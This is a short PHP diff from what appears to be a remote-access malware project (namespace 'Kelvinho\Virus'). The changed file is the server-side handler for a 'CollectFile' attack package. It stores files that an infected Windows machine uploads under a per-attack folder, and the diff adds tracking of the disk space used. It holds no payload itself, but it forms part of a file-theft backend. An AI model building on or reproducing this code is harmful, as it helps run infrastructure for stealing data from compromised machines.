@@ -4,6 +4,14 @@ use Kelvinho\Virus\Singleton\Logs;
 
 /** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectFile\CollectFile $this */
 
-for ($i = 0; $i < count($this->fileNames); $i++) if (!$this->requestData->hasFile("file$i")) Logs::error("Supposed to have file $i");
-for ($i = 0; $i < count($this->fileNames); $i++) $this->requestData->moveFile("file$i", DATA_FILE . "/attacks/$this->attack_id/file$i");
+$numberOfFiles = count($this->getFileNames());
+$size = 0;
+for ($i = 0; $i < $numberOfFiles; $i++) if (!$this->requestData->hasFile("file$i")) Logs::error("Supposed to have file $i");
+for ($i = 0; $i < $numberOfFiles; $i++) {
+    $fileName = DATA_FILE . "/attacks/$this->attack_id/file$i";
+    $this->requestData->moveFile("file$i", $fileName);
+    $size += filesize($fileName);
+}
+$this->usage()->setDisk($size);
+$this->usage()->saveState();
 $this->setExecuted();
